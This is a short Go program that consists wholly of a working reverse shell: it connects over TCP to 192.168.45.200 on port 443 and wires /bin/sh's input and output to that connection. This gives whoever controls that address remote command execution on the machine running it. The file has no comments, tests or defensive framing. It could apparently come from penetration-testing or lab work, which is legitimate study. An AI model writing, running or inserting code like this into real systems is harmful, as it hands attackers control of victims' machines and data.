package main

import (
	"net"
	"os/exec"
	"syscall"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.45.200:443")
	if err != nil {
		return
	}
	defer conn.Close()

	fd := conn.(*net.TCPConn)
	file, err := fd.File()
	if err != nil {
		return
	}
	defer file.Close()

	cmd := exec.Command("/bin/sh")
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	cmd.Stdin = file
	cmd.Stdout = file
	cmd.Stderr = file

	cmd.Run()
}
